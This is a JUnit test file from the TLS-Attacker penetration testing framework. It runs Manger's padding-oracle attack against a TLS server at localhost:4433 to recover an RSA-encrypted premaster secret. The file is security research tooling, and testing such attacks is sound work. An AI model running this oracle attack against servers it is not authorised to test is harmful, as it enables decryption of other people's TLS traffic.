/**
 * TLS-Attacker - A Modular Penetration Testing Framework for TLS
 *
 * Copyright 2014-2016 Ruhr University Bochum / Hackmanit GmbH
 *
 * Licensed under Apache License 2.0
 * http://www.apache.org/licenses/LICENSE-2.0
 */
package de.rub.nds.tlsattacker.attacks.pkcs1;

import de.rub.nds.tlsattacker.attacks.pkcs1.oracles.Pkcs1Oracle;
import de.rub.nds.tlsattacker.attacks.pkcs1.oracles.RealDirectMessagePkcs1Oracle;
import de.rub.nds.tlsattacker.tls.config.ClientCommandConfig;
import de.rub.nds.tlsattacker.tls.constants.CipherSuite;
import de.rub.nds.tlsattacker.tls.util.CertificateFetcher;
import de.rub.nds.tlsattacker.util.ArrayConverter;
import java.math.BigInteger;
import java.security.Security;
import java.security.interfaces.RSAPublicKey;
import java.util.Arrays;
import java.util.LinkedList;
import java.util.List;
import javax.crypto.Cipher;
import org.bouncycastle.jce.provider.BouncyCastleProvider;
import org.junit.Assert;
import org.junit.Ignore;
import org.junit.Test;

/**
 * 
 * @author Juraj Somorovsky - juraj.somorovsky@rub.de
 */
public class MangerAttackServerTest {

    public static final String CONNECT = "localhost:4433";
    private static final int PREMASTER_SECRET_LENGTH = 48;

    @Test
    @Ignore
    public final void testMangerAttack() throws Exception {

	Security.addProvider(new BouncyCastleProvider());

	ClientCommandConfig config = new ClientCommandConfig();
	config.setConnect(CONNECT);
	List<CipherSuite> ciphersuites = new LinkedList<>();
	ciphersuites.add(CipherSuite.TLS_RSA_WITH_AES_128_CBC_SHA);
	config.setCipherSuites(ciphersuites);

	RSAPublicKey publicKey = (RSAPublicKey) CertificateFetcher.fetchServerPublicKey(config);

	byte[] plainBytes = new byte[PREMASTER_SECRET_LENGTH];

	Cipher cipher = Cipher.getInstance("RSA/None/PKCS1Padding");
	cipher.init(Cipher.ENCRYPT_MODE, publicKey);
	byte[] cipherBytes = cipher.doFinal(plainBytes);

	config.setTlsTimeout(50);
	Pkcs1Oracle oracle = new RealDirectMessagePkcs1Oracle(publicKey, config);

	long start = System.currentTimeMillis();

	// we are handling plaintexts, so we insert raw message there
	Manger attacker = new Manger(cipherBytes, oracle);
	attacker.attack();
	BigInteger solution = attacker.getSolution();

	System.out.println(ArrayConverter.bytesToHexString(solution.toByteArray()));

	byte[] array = solution.toByteArray();
	byte[] last48 = Arrays.copyOfRange(array, array.length - PREMASTER_SECRET_LENGTH - 1, array.length - 1);
	Assert.assertArrayEquals(plainBytes, last48);

	System.out.println("Queries: " + oracle.getNumberOfQueries());
	System.out.println("Lasted: " + (System.currentTimeMillis() - start) + " millis.");
    }

}
